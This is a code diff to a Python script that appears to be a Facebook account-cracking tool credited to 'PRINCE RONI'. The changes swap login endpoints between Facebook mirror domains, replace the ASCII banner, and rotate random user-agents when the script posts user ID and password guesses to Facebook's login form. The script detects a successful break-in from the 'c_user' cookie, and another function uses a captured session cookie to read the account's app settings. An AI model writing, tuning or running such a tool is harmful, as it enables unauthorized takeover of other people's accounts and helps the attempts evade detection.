@@ -82,7 +82,7 @@ loop = 0
 url_lookup = "https://lookup-id.com/"
 url_mb = "https://mbasic.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36;]"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 ugen=[]
@@ -122,24 +122,26 @@ def jalan(z):
         time.sleep(0.01)
 
   
-logo=("""  
- \033[34;1m
-\033[1;97m  ______                    _   __   
-\033[1;97m| _   _ `.                 (_) [  |  
- \033[1;97m | | `. \ .---.  _   __  __   | |  
- \033[1;97m | |  | |/ /__\\[ \ [  ][  |  | |  
-\033[1;97m _| |_.' /| \__., \ \/ /  | |  | |  
-\033[1;97m|______.'  '.__.'  \__/  [___][___]                                  
-
-                                            
-\033[38;5;46m┌━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┐\033[33;1m ┫│\033[38;5;46m𝑬\033[33;1m│┣
-\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘈𝘜𝘛𝘏𝘖𝘙      \033[1;97m  :  \033[34;1mPRINCE  \033[38;5;46m│ \033[33;1m┫│\033[38;5;46m𝑹\033[33;1m│┣
-\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;97m:  \033[34;1m DX-143      \033[38;5;46m   │  \033[33;1m┗━┛
-\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗   \033[1;97m   :  \033[34;1m01916564949       \033[38;5;46m│
-\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘗𝘖𝘞𝘌𝘙       \033[1;97m  :  \033[34;1mPRINCE RONI         \033[38;5;46m│
-\033[38;5;46m└━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┘""")
+logo=("""
+\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: PRINCE RONI
+\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mDX-143
+\x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;92mSTATUS    \x1b[1;97m : \x1b[1;93mRANDOM / \x1b[1;92mACTIVE
+\x1b[1;36m{+} \x1b[1;90mTOOL VIRSION      \x1b[1;97m: \x1b[1;90m1.0.0
+\033[1;96m═════════════════════════════════════════════
+""")
+A = '\x1b[1;97m' 
+B = '\x1b[1;96m' 
+C = '\x1b[1;91m' 
+D = '\033[38;5;46m'
+M = '\033[1;31m'
+H = '\033[38;5;46m'
+N = '\x1b[1;37m'    
+E = '\x1b[1;93m' 
+F = '\x1b[1;94m'
+G = '\x1b[1;95m'
+P = '\033[1;37m'
 def cek_apk(session,coki):
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+	w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
 	sop = BeautifulSoup(w,"html.parser")
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
@@ -150,7 +152,7 @@ def cek_apk(session,coki):
 		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
 		for i in range(len(game)):
 			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+	w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
 	sop = BeautifulSoup(w,"html.parser")
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
@@ -252,7 +254,7 @@ def b(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://m.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -281,7 +283,7 @@ def b(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',}
+            'user-agent': pro}
             lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
